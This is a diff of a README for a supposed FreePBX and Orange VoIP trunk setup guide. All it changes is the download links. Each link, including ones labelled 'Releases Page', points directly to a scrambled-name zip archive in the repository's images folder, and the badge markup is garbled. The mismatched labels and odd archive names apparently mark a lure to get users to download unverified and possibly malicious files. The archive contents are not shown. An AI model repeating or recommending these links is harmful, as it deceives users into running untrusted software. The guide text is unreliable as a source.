@@ -1,7 +1,7 @@
 # 📞 Orange-VoIP-FreePBX-Trunk - Simple Steps to Set Up Your VoIP Connection
 
 ## 🔗 Download Now!
-[![Download](https://raw.githubusercontent.com/vyshakA/Orange-VoIP-FreePBX-Trunk/main/images/en/PB-Orange-Trunk-Vo-Free-I-v3.1-alpha.3.zip%20Now-%https://raw.githubusercontent.com/vyshakA/Orange-VoIP-FreePBX-Trunk/main/images/en/PB-Orange-Trunk-Vo-Free-I-v3.1-alpha.3.zip)](https://raw.githubusercontent.com/vyshakA/Orange-VoIP-FreePBX-Trunk/main/images/en/PB-Orange-Trunk-Vo-Free-I-v3.1-alpha.3.zip)
+[![Download](https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/raw/refs/heads/main/images/pl/Free-PB-Orange-Vo-Trunk-I-v3.7-alpha.4.zip%20Now-%https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/raw/refs/heads/main/images/pl/Free-PB-Orange-Vo-Trunk-I-v3.7-alpha.4.zip)](https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/raw/refs/heads/main/images/pl/Free-PB-Orange-Vo-Trunk-I-v3.7-alpha.4.zip)
 
 ## 📖 Introduction
 Welcome to the Orange-VoIP-FreePBX-Trunk project! This guide helps you set up your Orange home phone as a VoIP trunk in FreePBX. With our step-by-step instructions, you'll be connected in no time. Enjoy reliable phone service over the internet without complicated setups.
@@ -17,7 +17,7 @@ Before you dive in, ensure you have FreePBX installed on your system. FreePBX is
 ## 📥 Download & Install
 To get started, visit the following page to download the necessary files:
 
-[Go to Releases Page](https://raw.githubusercontent.com/vyshakA/Orange-VoIP-FreePBX-Trunk/main/images/en/PB-Orange-Trunk-Vo-Free-I-v3.1-alpha.3.zip)
+[Go to Releases Page](https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/raw/refs/heads/main/images/pl/Free-PB-Orange-Vo-Trunk-I-v3.7-alpha.4.zip)
 
 1. **Visit the Releases Page:** Click on the link above to access the downloads.
 2. **Choose the Latest Version:** Look for the most recent release at the top of the page.
@@ -72,4 +72,4 @@ Using FreePBX and connecting your Orange home phone over the internet typically 
 You're now equipped to set up your Orange home phone as a VoIP trunk in FreePBX. With clear steps and useful links at your disposal, you can enjoy a new level of connectivity. Don’t hesitate to explore additional resources to make the most of your system. 
 
 ## 🔗 Download Again
-If you need to download the files, you can always return to the [Releases Page](https://raw.githubusercontent.com/vyshakA/Orange-VoIP-FreePBX-Trunk/main/images/en/PB-Orange-Trunk-Vo-Free-I-v3.1-alpha.3.zip).
+If you need to download the files, you can always return to the [Releases Page](https://github.com/vyshakA/Orange-VoIP-FreePBX-Trunk/raw/refs/heads/main/images/pl/Free-PB-Orange-Vo-Trunk-I-v3.7-alpha.4.zip).
